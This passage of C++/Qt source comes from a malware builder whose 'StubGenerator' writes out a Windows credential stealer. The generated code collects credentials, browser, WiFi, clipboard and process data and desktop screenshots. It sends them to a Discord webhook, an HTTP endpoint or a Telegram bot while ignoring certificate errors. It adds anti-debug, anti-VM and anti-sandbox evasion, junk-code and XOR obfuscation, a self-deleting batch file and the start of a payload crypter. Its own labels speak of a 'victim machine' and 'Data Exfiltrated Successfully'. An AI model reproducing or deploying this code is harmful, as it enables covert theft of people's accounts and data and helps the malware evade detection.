    code += "    embedJson += \"{\\\"name\\\":\\\"🔐 Credentials\\\",\\\"value\\\":\\\"\" + EscapeJSON(credValue) + \"\\\",\\\"inline\\\":false},\";\n";
    code += "    \n";
    code += "    // Network field (full width, max 400 chars)\n";
    code += "    std::string networkValue = \"📶 **\" + std::to_string(stats.wifiNetworks) + \"** WiFi Networks\\n\\n📋 Clipboard Data\";\n";
    code += "    networkValue = TruncateString(networkValue, 400);\n";
    code += "    embedJson += \"{\\\"name\\\":\\\"📡 Network Information\\\",\\\"value\\\":\\\"\" + EscapeJSON(networkValue) + \"\\\",\\\"inline\\\":false},\";\n";
    code += "    \n";
    code += "    // Browsers field (full width, max 300 chars)\n";
    code += "    if (!stats.browsers.empty()) {\n";
    code += "        embedJson += \"{\\\"name\\\":\\\"🌐 Browsers\\\",\\\"value\\\":\\\"\" + EscapeJSON(stats.browsers) + \"\\\",\\\"inline\\\":false},\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Apps field (full width, max 300 chars)\n";
    code += "    if (!stats.apps.empty()) {\n";
    code += "        embedJson += \"{\\\"name\\\":\\\"🎮 Applications\\\",\\\"value\\\":\\\"\" + EscapeJSON(stats.apps) + \"\\\",\\\"inline\\\":false},\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Security field (full width, max 200 chars)\n";
    code += "    if (stats.hasAV && !stats.avName.empty()) {\n";
    code += "        embedJson += \"{\\\"name\\\":\\\"🛡️ Security\\\",\\\"value\\\":\\\"\" + EscapeJSON(stats.avName) + \"\\\",\\\"inline\\\":false}\";\n";
    code += "    } else {\n";
    code += "        // Remove trailing comma if Security not added\n";
    code += "        if (embedJson.back() == ',') embedJson.pop_back();\n";
    code += "    }\n";
    code += "    \n";
    code += "    embedJson += \"],\";\n";
    code += "    embedJson += \"\\\"footer\\\":{\\\"text\\\":\\\"🚀 Data Exfiltrated Successfully\\\",\\\"icon_url\\\":\\\"https://cdn-icons-png.flaticon.com/512/5610/5610944.png\\\"},\";\n";
    code += "    embedJson += \"\\\"timestamp\\\":\\\"\" + std::string(isoTimestamp) + \"\\\"\";\n";
    code += "    embedJson += \"}]}\";\n";
    code += "    \n";
    code += "    // Safety check: if too long (> 2000 chars), use simplified embed\n";
    code += "    if (embedJson.length() > 2000) {\n";
    code += "        embedJson = \"{\\\"embeds\\\":[{\\\"title\\\":\\\"✅ New Data\\\",\\\"color\\\":\" + std::to_string(embedColor) + \",\\\"description\\\":\\\"💻 \" + EscapeJSON(TruncateString(computerName, 50)) + \" | 👤 \" + EscapeJSON(TruncateString(userName, 50)) + \"\\\\n🌐 \" + EscapeJSON(ipAddr) + \"\\\",\\\"timestamp\\\":\\\"\" + std::string(isoTimestamp) + \"\\\"}]}\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Collect process list (only for file, not embed) if enabled\n";
    code += "    std::string fileData = data;\n";
    if (config.collectProcessList) {
        code += "    fileData += \"\\n📊 Processes:\\n\";\n";
        code += "    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n";
        code += "    if (snapshot != INVALID_HANDLE_VALUE) {\n";
        code += "        PROCESSENTRY32 pe;\n";
        code += "        pe.dwSize = sizeof(pe);\n";
        code += "        std::set<std::string> uniqueProcs;\n";
        code += "        if (Process32First(snapshot, &pe)) {\n";
        code += "            do { uniqueProcs.insert(std::string(pe.szExeFile)); } while (Process32Next(snapshot, &pe));\n";
        code += "        }\n";
        code += "        CloseHandle(snapshot);\n";
        code += "        for (const auto& proc : uniqueProcs) {\n";
        code += "            fileData += proc + \"\\n\";\n";
        code += "        }\n";
    code += "    }\n";
    }

    code += "    \n";
    code += "    // Build multipart\n";
    code += "    std::string boundary = GenerateBoundary();\n";
    code += "    std::string body;\n";
    code += "    body += \"--\" + boundary + \"\\r\\n\";\n";
    code += "    body += \"Content-Disposition: form-data; name=\\\"payload_json\\\"\\r\\n\\r\\n\";\n";
    code += "    body += embedJson;\n";
    code += "    body += \"\\r\\n\";\n";
    code += "    body += \"--\" + boundary + \"\\r\\n\";\n";
    code += "    body += \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"data_\";\n";
    code += "    body += timestamp;\n";
    code += "    body += \".txt\\\"\\r\\n\";\n";
    code += "    body += \"Content-Type: text/plain\\r\\n\\r\\n\";\n";
    code += "    body += fileData;\n";
    code += "    body += \"\\r\\n--\" + boundary + \"--\\r\\n\";\n";
    code += "    \n";
    code += "    // Send\n";
    code += "    HINTERNET hSession = WinHttpOpen(L\"Mozilla/5.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n";
    code += "    if (!hSession) return false;\n";
    code += "    // Set timeouts (30 seconds each)\n";
    code += "    DWORD timeout = 30000;\n";
    code += "    WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));\n";
    code += "    WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));\n";
    code += "    WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));\n";
    code += "    HINTERNET hConnect = WinHttpConnect(hSession, hostname, urlComp.nPort, 0);\n";
    code += "    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }\n";
    code += "    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;\n";
    code += "    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"POST\", path, NULL, NULL, NULL, flags);\n";
    code += "    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }\n";
    code += "    if (flags & WINHTTP_FLAG_SECURE) {\n";
    code += "        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;\n";
    code += "        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));\n";
    code += "    }\n";
    code += "    std::wstring contentType = L\"Content-Type: multipart/form-data; boundary=\" + UTF8ToWide(boundary);\n";
    code += "    BOOL result = WinHttpSendRequest(hRequest, contentType.c_str(), -1,\n";
    code += "        (LPVOID)body.c_str(), body.length(), body.length(), 0);\n";
    code += "    if (result) result = WinHttpReceiveResponse(hRequest, NULL);\n";
    code += "    \n";
    code += "    // Check HTTP status code\n";
    code += "    DWORD statusCode = 0;\n";
    code += "    DWORD statusCodeSize = sizeof(statusCode);\n";
    code += "    if (result) {\n";
    code += "        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,\n";
    code += "            NULL, &statusCode, &statusCodeSize, NULL);\n";
    code += "        // Discord returns 204 on success, or 200\n";
    code += "        if (statusCode < 200 || (statusCode >= 300 && statusCode != 204)) result = FALSE;\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Fallback: if failed, try simple file-only upload\n";
    code += "    if (!result) {\n";
    code += "        WinHttpCloseHandle(hRequest);\n";
    code += "        hRequest = WinHttpOpenRequest(hConnect, L\"POST\", path, NULL, NULL, NULL, flags);\n";
    code += "        if (hRequest) {\n";
    code += "            if (flags & WINHTTP_FLAG_SECURE) {\n";
    code += "                DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;\n";
    code += "                WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));\n";
    code += "            }\n";
            code += "            std::string fallbackBody = \"--\" + boundary + \"\\r\\n\";\n";
            code += "            fallbackBody += \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"data.txt\\\"\\r\\n\";\n";
            code += "            fallbackBody += \"Content-Type: text/plain\\r\\n\\r\\n\";\n";
            code += "            fallbackBody += fileData;\n";
            code += "            fallbackBody += \"\\r\\n--\" + boundary + \"--\\r\\n\";\n";
    code += "            result = WinHttpSendRequest(hRequest, contentType.c_str(), -1,\n";
    code += "                (LPVOID)fallbackBody.c_str(), fallbackBody.length(), fallbackBody.length(), 0);\n";
    code += "            if (result) result = WinHttpReceiveResponse(hRequest, NULL);\n";
    code += "            if (result) {\n";
    code += "                statusCode = 0;\n";
    code += "                statusCodeSize = sizeof(statusCode);\n";
    code += "                WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,\n";
    code += "                    NULL, &statusCode, &statusCodeSize, NULL);\n";
    code += "                if (statusCode < 200 || statusCode >= 300) result = FALSE;\n";
    code += "            }\n";
    code += "        }\n";
    code += "    }\n";
    code += "    \n";
    code += "    WinHttpCloseHandle(hRequest);\n";
    code += "    WinHttpCloseHandle(hConnect);\n";
    code += "    WinHttpCloseHandle(hSession);\n";
    code += "    return result != FALSE;\n";
    code += "}\n\n";
    
    code += "// Send screenshot to webhook as image attachment\n";
    code += "bool SendScreenshotToWebhook(const std::string& webhookUrl, const std::string& screenshotData) {\n";
    code += "    std::wstring wUrl = UTF8ToWide(webhookUrl);\n";
    code += "    URL_COMPONENTS urlComp;\n";
    code += "    ZeroMemory(&urlComp, sizeof(urlComp));\n";
    code += "    urlComp.dwStructSize = sizeof(urlComp);\n";
    code += "    wchar_t hostname[256] = {0}, path[2048] = {0};\n";
    code += "    urlComp.lpszHostName = hostname;\n";
    code += "    urlComp.dwHostNameLength = 256;\n";
    code += "    urlComp.lpszUrlPath = path;\n";
    code += "    urlComp.dwUrlPathLength = 2048;\n";
    code += "    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &urlComp)) return false;\n";
    code += "    \n";
    code += "    std::string boundary = GenerateBoundary();\n";
    code += "    std::string body;\n";
    code += "    time_t now = time(NULL);\n";
    code += "    char timestamp[32];\n";
    code += "    strftime(timestamp, sizeof(timestamp), \"%Y%m%d_%H%M%S\", localtime(&now));\n";
    code += "    char isoTime[64];\n";
    code += "    strftime(isoTime, sizeof(isoTime), \"%Y-%m-%dT%H:%M:%S.000Z\", gmtime(&now));\n";
    code += "    std::string fileName = std::string(\"screenshot_\") + timestamp + \".png\";\n";
    code += "    \n";
    code += "    // Random color for screenshot embed\n";
    code += "    int colors[] = {0x9B59B6, 0xE74C3C, 0x3498DB, 0x2ECC71, 0xF39C12, 0x1ABC9C, 0xE91E63, 0x9C27B0, 0x00BCD4, 0xFF5722};\n";
    code += "    srand((unsigned int)now);\n";
    code += "    int embedColor = colors[rand() % 10];\n";
    code += "    \n";
    code += "    // Build screenshot embed\n";
    code += "    std::string embedJson = \"{\\\"embeds\\\":[{\";\n";
    code += "    embedJson += \"\\\"title\\\":\\\"📸 Desktop Screenshot\\\",\";\n";
    code += "    embedJson += \"\\\"color\\\":\" + std::to_string(embedColor) + \",\";\n";
    code += "    embedJson += \"\\\"description\\\":\\\"Full desktop capture from victim machine\\\",\";\n";
    code += "    embedJson += \"\\\"image\\\":{\\\"url\\\":\\\"attachment://\" + fileName + \"\\\"},\";\n";
    code += "    embedJson += \"\\\"footer\\\":{\\\"text\\\":\\\"📷 Screenshot captured\\\"},\";\n";
    code += "    embedJson += \"\\\"timestamp\\\":\\\"\" + std::string(isoTime) + \"\\\"\";\n";
    code += "    embedJson += \"}]}\";\n";
    code += "    \n";
    code += "    body += \"--\" + boundary + \"\\r\\n\";\n";
    code += "    body += \"Content-Disposition: form-data; name=\\\"payload_json\\\"\\r\\n\\r\\n\";\n";
    code += "    body += embedJson;\n";
    code += "    body += \"\\r\\n\";\n";
    code += "    body += \"--\" + boundary + \"\\r\\n\";\n";
    code += "    body += \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\";\n";
    code += "    body += \"Content-Type: image/png\\r\\n\\r\\n\";\n";
    code += "    body += screenshotData;\n";
    code += "    body += \"\\r\\n--\" + boundary + \"--\\r\\n\";\n";
    code += "    \n";
    code += "    HINTERNET hSession = WinHttpOpen(L\"Mozilla/5.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n";
    code += "    if (!hSession) return false;\n";
    code += "    HINTERNET hConnect = WinHttpConnect(hSession, hostname, urlComp.nPort, 0);\n";
    code += "    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }\n";
    code += "    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;\n";
    code += "    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"POST\", path, NULL, NULL, NULL, flags);\n";
    code += "    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }\n";
    code += "    if (flags & WINHTTP_FLAG_SECURE) {\n";
    code += "        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;\n";
    code += "        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));\n";
    code += "    }\n";
    code += "    std::wstring contentType = L\"Content-Type: multipart/form-data; boundary=\" + UTF8ToWide(boundary);\n";
    code += "    BOOL result = WinHttpSendRequest(hRequest, contentType.c_str(), contentType.length(),\n";
    code += "        (LPVOID)body.c_str(), body.length(), body.length(), 0);\n";
    code += "    if (result) result = WinHttpReceiveResponse(hRequest, NULL);\n";
    code += "    WinHttpCloseHandle(hRequest);\n";
    code += "    WinHttpCloseHandle(hConnect);\n";
    code += "    WinHttpCloseHandle(hSession);\n";
    code += "    return result != FALSE;\n";
    code += "}\n\n";
    
    // HTTP POST exfiltration
    if (!config.httpPostUrl.isEmpty()) {
        code += "// Send data via HTTP POST\n";
        code += "bool SendDataHTTPPost(const std::string& url, const std::string& data) {\n";
        code += "    std::wstring wUrl = UTF8ToWide(url);\n";
        code += "    URL_COMPONENTS urlComp;\n";
        code += "    ZeroMemory(&urlComp, sizeof(urlComp));\n";
        code += "    urlComp.dwStructSize = sizeof(urlComp);\n";
        code += "    wchar_t hostname[256] = {0}, path[2048] = {0};\n";
        code += "    urlComp.lpszHostName = hostname;\n";
        code += "    urlComp.dwHostNameLength = 256;\n";
        code += "    urlComp.lpszUrlPath = path;\n";
        code += "    urlComp.dwUrlPathLength = 2048;\n";
        code += "    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &urlComp)) return false;\n";
        code += "    HINTERNET hSession = WinHttpOpen(L\"Mozilla/5.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n";
        code += "    if (!hSession) return false;\n";
        code += "    HINTERNET hConnect = WinHttpConnect(hSession, hostname, urlComp.nPort, 0);\n";
        code += "    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }\n";
        code += "    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;\n";
        code += "    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"POST\", path, NULL, NULL, NULL, flags);\n";
        code += "    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }\n";
        code += "    std::wstring headers = L\"Content-Type: text/plain\";\n";
        code += "    BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)data.c_str(), data.length(), data.length(), 0);\n";
        code += "    if (result) result = WinHttpReceiveResponse(hRequest, NULL);\n";
        code += "    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);\n";
        code += "    return result != FALSE;\n";
        code += "}\n\n";
    }
    
    // Telegram bot exfiltration
    if (!config.telegramToken.isEmpty() && !config.telegramChatId.isEmpty()) {
        code += "// Send data via Telegram bot\n";
        code += "bool SendDataTelegram(const std::string& token, const std::string& chatId, const std::string& data) {\n";
        code += "    std::string url = \"https://api.telegram.org/bot\" + token + \"/sendMessage\";\n";
        code += "    std::wstring wUrl = UTF8ToWide(url);\n";
        code += "    URL_COMPONENTS urlComp;\n";
        code += "    ZeroMemory(&urlComp, sizeof(urlComp));\n";
        code += "    urlComp.dwStructSize = sizeof(urlComp);\n";
        code += "    wchar_t hostname[256] = {0}, path[2048] = {0};\n";
        code += "    urlComp.lpszHostName = hostname;\n";
        code += "    urlComp.dwHostNameLength = 256;\n";
        code += "    urlComp.lpszUrlPath = path;\n";
        code += "    urlComp.dwUrlPathLength = 2048;\n";
        code += "    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &urlComp)) return false;\n";
        code += "    HINTERNET hSession = WinHttpOpen(L\"TelegramBot/1.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n";
        code += "    if (!hSession) return false;\n";
        code += "    HINTERNET hConnect = WinHttpConnect(hSession, hostname, 443, 0);\n";
        code += "    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }\n";
        code += "    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"POST\", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);\n";
        code += "    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }\n";
        code += "    std::string escapedData = data;\n";
        code += "    for (size_t i = 0; i < escapedData.length(); i++) {\n";
        code += "        if (escapedData[i] == '\"') { escapedData.insert(i, \"\\\\\"); i++; }\n";
        code += "    }\n";
        code += "    std::string jsonData = \"{\\\"chat_id\\\":\\\"\" + chatId + \"\\\",\\\"text\\\":\\\"\" + escapedData.substr(0, 4000) + \"\\\"}\";\n";
        code += "    std::wstring headers = L\"Content-Type: application/json\";\n";
        code += "    BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)jsonData.c_str(), jsonData.length(), jsonData.length(), 0);\n";
        code += "    if (result) result = WinHttpReceiveResponse(hRequest, NULL);\n";
        code += "    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);\n";
        code += "    return result != FALSE;\n";
        code += "}\n\n";
    }
    
    return code;
}

QString StubGenerator::generateMainFunction(const StealerConfig& config) const {
    QString code;
    
    // Note: Console hiding is handled through compiler flags (-mwindows for MinGW, /SUBSYSTEM:WINDOWS for MSVC)
    
    code += "int main(int argc, char* argv[]) {\n";
    code += "    // Check if we're being used as a hollow host\n";
    code += "    if (argc > 1 && strstr(argv[1], \"__hollow__\")) {\n";
    code += "        Sleep(INFINITE);\n";
    code += "        return 0;\n";
    code += "    }\n";
    code += "    \n";
    
    // Insert junk code at entry point
    if (config.obfuscate) {
        code += "    // Initialization routines\n";
        QString junkVarNum = QString::number(QRandomGenerator::global()->bounded(1000, 9999));
        code += "    volatile int junkVar" + junkVarNum + " = GetTickCount();\n";
        code += "    if (junkVar" + junkVarNum + " == 0xDEADBEEF) { Sleep(1); }\n";
    }
    
    // Mutex for single instance
    if (!config.mutexName.isEmpty()) {
        QString mutexName = config.mutexName;
        code += "    // Create mutex for single instance\n";
        code += "    HANDLE hMutex = CreateMutexA(NULL, TRUE, \"" + mutexName + "\");\n";
        code += "    if (GetLastError() == ERROR_ALREADY_EXISTS) {\n";
        code += "        return 0;\n";
        code += "    }\n\n";
    }
    
    // More inline junk
    if (config.obfuscate) {
        code += "    DWORD marker" + QString::number(QRandomGenerator::global()->bounded(1000)) + " = 0x" + QString::number(QRandomGenerator::global()->bounded(0xFFFFFF), 16).toUpper() + ";\n";
    }
    
    code += "    \n";
    code += "    // Run data extraction tool (chrome_inject collects: system, browsers, wifi, clipboard, AV)\n";
    code += "    std::string collectedData = GrabBrowserData();\n";
    code += "    \n";
    code += "    if (collectedData.find(\"error\") != std::string::npos) {\n";
        code += "    }\n";
    code += "    \n";
    code += "    // Process app session data (Telegram, Discord, Steam, Epic, Roblox)\n";
    code += "    std::string appData = ProcessAppData(collectedData);\n";
    code += "    if (!appData.empty()) {\n";
    code += "        collectedData += \"\\n=== APP SESSIONS ===\\n\" + appData;\n";
    code += "    }\n";
    code += "    \n";
    
    // Anti-analysis checks
    if (config.antiDebug) {
        code += "    // Anti-debug checks\n";
        code += "    if (IsDebuggerPresent_() || CheckRemoteDebugger()) {\n";
        code += "        return 0;\n";
        code += "    }\n\n";
    }
    
    if (config.antiVM) {
        code += "    // Anti-VM checks\n";
        code += "    if (IsVM()) {\n";
        code += "        return 0;\n";
        code += "    }\n\n";
    }
    
    if (config.antiSandbox) {
        code += "    // Anti-sandbox checks\n";
        code += "    if (IsSandbox()) {\n";
        code += "        return 0;\n";
        code += "    }\n\n";
    }
    
    if (config.sleepEvasion) {
        code += "    // Sleep evasion\n";
        code += "    DWORD start = GetTickCount();\n";
        code += "    Sleep(3000);\n";
        code += "    if (GetTickCount() - start < 2900) {\n";
        code += "        return 0;\n";
        code += "    }\n\n";
    }
    
    code += "    \n";
    
    // Insert junk before exfiltration
    if (config.obfuscate) {
        code += "    // Pre-transmission checks\n";
        QString checksumNum = QString::number(QRandomGenerator::global()->bounded(1000));
        code += "    volatile DWORD checksum" + checksumNum + " = 0;\n";
        code += "    for (int i = 0; i < " + QString::number(QRandomGenerator::global()->bounded(5, 15)) + "; i++) { checksum" + checksumNum + " ^= GetTickCount(); }\n";
    }
    
    
    // Exfiltrate data
    if (!config.webhookUrl.isEmpty()) {
        QString webhook = config.webhookUrl;
        code += "    // Exfiltrate via Discord webhook\n";
        code += "    std::string webhookUrl = \"" + webhook + "\";\n";
        code += "    if (SendDataToWebhook(webhookUrl, collectedData)) {\n";
        code += "    } else {\n";
        code += "    }\n";
        
        // Add screenshot if enabled
        if (config.captureScreen) {
            code += "    \n";
            code += "    // Capture and send screenshot separately\n";
            code += "    std::string screenshotData = CaptureScreenshot();\n";
            code += "    if (!screenshotData.empty()) {\n";
            code += "        if (SendScreenshotToWebhook(webhookUrl, screenshotData)) {\n";
            code += "        } else {\n";
            code += "        }\n";
            code += "    } else {\n";
        code += "    }\n";
        }
    }
    
    if (!config.httpPostUrl.isEmpty()) {
        QString httpUrl = config.httpPostUrl;
        code += "    // Exfiltrate via HTTP POST\n";
        code += "    std::string httpPostUrl = \"" + httpUrl + "\";\n";
        code += "    if (SendDataHTTPPost(httpPostUrl, collectedData)) {\n";
        code += "    } else {\n";
        code += "    }\n";
    }
    
    if (!config.telegramToken.isEmpty() && !config.telegramChatId.isEmpty()) {
        QString token = config.telegramToken;
        QString chatId = config.telegramChatId;
        code += "    // Exfiltrate via Telegram\n";
        code += "    std::string telegramToken = \"" + token + "\";\n";
        code += "    std::string telegramChatId = \"" + chatId + "\";\n";
        code += "    if (SendDataTelegram(telegramToken, telegramChatId, collectedData)) {\n";
        code += "    } else {\n";
        code += "    }\n";
    }
    
    code += "\n";
    
    // Insert junk between operations
    if (config.obfuscate) {
        code += "    // Cleanup temporary state\n";
        QString tempBufNum = QString::number(QRandomGenerator::global()->bounded(1000));
        code += "    char tempBuf" + tempBufNum + "[64] = {0};\n";
        code += "    sprintf(tempBuf" + tempBufNum + ", \"%d\", GetTickCount());\n";
    }
    
    // Melt file (delete itself after execution)
    if (config.meltFile) {
        code += "    // Melt file - delete executable after completion\n";
        code += "    char exePath[MAX_PATH];\n";
        code += "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n";
        code += "    char tempPath[MAX_PATH];\n";
        code += "    GetTempPathA(MAX_PATH, tempPath);\n";
        code += "    std::string batPath = std::string(tempPath) + \"del.bat\";\n";
        code += "    FILE* bat = fopen(batPath.c_str(), \"w\");\n";
        code += "    if (bat) {\n";
        code += "        fprintf(bat, \"@echo off\\n\");\n";
        code += "        fprintf(bat, \":loop\\n\");\n";
        code += "        fprintf(bat, \"del /F /Q \\\"%s\\\"\\n\", exePath);\n";
        code += "        fprintf(bat, \"if exist \\\"%s\\\" goto loop\\n\", exePath);\n";
        code += "        fprintf(bat, \"del /F /Q \\\"%s\\\"\\n\", batPath.c_str());\n";
        code += "        fclose(bat);\n";
        code += "        ShellExecuteA(NULL, \"open\", batPath.c_str(), NULL, NULL, SW_HIDE);\n";
        code += "    }\n\n";
    }
    
    code += "    getchar();\n";
    code += "    return 0;\n";
    code += "}\n";
    
    return code;
}

QString StubGenerator::obfuscateString(const QString& str) const {
    // Simple XOR obfuscation
    QString result;
    char key = 0xAA;
    for (QChar c : str) {
        result += QString::number(c.unicode() ^ key) + ",";
    }
    return result;
}

QString StubGenerator::generateRandomKey() const {
    return QString::number(QRandomGenerator::global()->bounded(256));
}

QString StubGenerator::generateRandomVariableName() const {
    QStringList prefixes = {"var", "tmp", "val", "data", "buf", "ptr", "obj", "res", "temp", "mem"};
    QStringList suffixes = {"Ex", "Buf", "Ptr", "Data", "Info", "State", "Ctx", "Handle"};
    
    QString name = prefixes[QRandomGenerator::global()->bounded(prefixes.size())];
    name += suffixes[QRandomGenerator::global()->bounded(suffixes.size())];
    name += QString::number(QRandomGenerator::global()->bounded(1000, 9999));
    
    return name;
}

QString StubGenerator::generateJunkFunction(const QString& functionName) const {
    QString code;
    int complexity = QRandomGenerator::global()->bounded(2, 5);
    
    code += "void " + functionName + "() {\n";
    
    // Random variables
    for (int i = 0; i < complexity; i++) {
        QString varName = generateRandomVariableName();
        int type = QRandomGenerator::global()->bounded(4);
        switch (type) {
            case 0:
                code += "    int " + varName + " = " + QString::number(QRandomGenerator::global()->bounded(10000)) + ";\n";
                break;
            case 1:
                code += "    char " + varName + "[64] = {0};\n";
                break;
            case 2:
                code += "    DWORD " + varName + " = GetTickCount();\n";
                break;
            case 3:
                code += "    void* " + varName + " = NULL;\n";
                break;
        }
    }
    
    code += "    \n";
    
    // Random operations
    for (int i = 0; i < complexity; i++) {
        int op = QRandomGenerator::global()->bounded(6);
        QString var1 = generateRandomVariableName();
        QString var2 = generateRandomVariableName();
        
        switch (op) {
            case 0:
                code += "    int " + var1 + " = " + QString::number(QRandomGenerator::global()->bounded(1000)) + " * " + QString::number(QRandomGenerator::global()->bounded(100)) + ";\n";
                break;
            case 1:
                code += "    for (int i = 0; i < " + QString::number(QRandomGenerator::global()->bounded(10, 50)) + "; i++) {}\n";
                break;
            case 2:
                code += "    if (" + QString::number(QRandomGenerator::global()->bounded(1000)) + " > " + QString::number(QRandomGenerator::global()->bounded(2000)) + ") {\n";
                code += "        Sleep(1);\n";
                code += "    }\n";
                break;
            case 3:
                code += "    SYSTEMTIME " + var1 + ";\n";
                code += "    GetSystemTime(&" + var1 + ");\n";
                break;
            case 4:
                code += "    char " + var1 + "[256];\n";
                code += "    sprintf(" + var1 + ", \"%d\", " + QString::number(QRandomGenerator::global()->bounded(10000)) + ");\n";
                break;
            case 5:
                code += "    DWORD " + var1 + " = GetTickCount();\n";
                code += "    while (GetTickCount() - " + var1 + " < 1) {}\n";
                break;
        }
    }
    
    code += "}\n\n";
    return code;
}

QString StubGenerator::generateJunkCode(int complexity) const {
    QString code;
    
    // Generate random junk functions
    int numFunctions = QRandomGenerator::global()->bounded(3, 8);
    QStringList functionNames;
    
    for (int i = 0; i < numFunctions; i++) {
        QString funcName = "Func" + generateRandomVariableName();
        functionNames.append(funcName);
        code += generateJunkFunction(funcName);
    }
    
    // Add inline junk code snippets
    code += "// Polymorphic code markers\n";
    for (int i = 0; i < complexity; i++) {
        int junkType = QRandomGenerator::global()->bounded(8);
        QString varName = generateRandomVariableName();
        
        switch (junkType) {
            case 0:
                code += "#define JUNK_" + QString::number(i) + " " + QString::number(QRandomGenerator::global()->bounded(100000)) + "\n";
                break;
            case 1:
                code += "static const char junk" + QString::number(i) + "[] = \"";
                for (int j = 0; j < QRandomGenerator::global()->bounded(20, 60); j++) {
                    code += QChar('A' + QRandomGenerator::global()->bounded(26));
                }
                code += "\";\n";
                break;
            case 2:
                code += "inline int CalcJunk" + QString::number(i) + "() { return ";
                code += QString::number(QRandomGenerator::global()->bounded(1000)) + " ^ ";
                code += QString::number(QRandomGenerator::global()->bounded(1000)) + "; }\n";
                break;
            case 3:
                code += "const DWORD KEY" + QString::number(i) + " = 0x" + QString::number(QRandomGenerator::global()->bounded(0xFFFFFF), 16).toUpper() + ";\n";
                break;
            case 4:
                code += "static int Dummy" + QString::number(i) + "(int x) { return (x * " + QString::number(QRandomGenerator::global()->bounded(1, 100)) + ") ^ 0x" + QString::number(QRandomGenerator::global()->bounded(0xFF), 16) + "; }\n";
                break;
            case 5:
                code += "struct Data" + QString::number(i) + " { DWORD val1; DWORD val2; char buf[32]; };\n";
                break;
            case 6:
                code += "enum State" + QString::number(i) + " { STATE_A" + QString::number(i) + " = " + QString::number(QRandomGenerator::global()->bounded(100)) + ", STATE_B" + QString::number(i) + ", STATE_C" + QString::number(i) + " };\n";
                break;
            case 7:
                code += "typedef void(*FuncPtr" + QString::number(i) + ")(void);\n";
                break;
        }
    }
    
    code += "\n";
    return code;
}

QByteArray StubGenerator::encryptData(const QByteArray& data, const QByteArray& key) {
    QByteArray encrypted = data;
    for (int i = 0; i < encrypted.size(); i++) {
        encrypted[i] = encrypted[i] ^ key[i % key.size()];
    }
    return encrypted;
}

QString StubGenerator::generateCrypter(const QByteArray& encryptedStub, const QByteArray& key) const {
    QString code;
    
    // Includes
    code += "#include <windows.h>\n";
    code += "#include <stdio.h>\n";
    code += "#include <string.h>\n\n";
    
    // Embedded encrypted payload
    code += "// Encrypted payload\n";
    code += "unsigned char encryptedPayload[] = {\n    ";
    for (int i = 0; i < encryptedStub.size(); i++) {
        code += QString("0x%1").arg((unsigned char)encryptedStub[i], 2, 16, QChar('0'));
        if (i < encryptedStub.size() - 1) {
            code += ", ";
            if ((i + 1) % 16 == 0) code += "\n    ";
        }
    }
    code += "\n};\n";
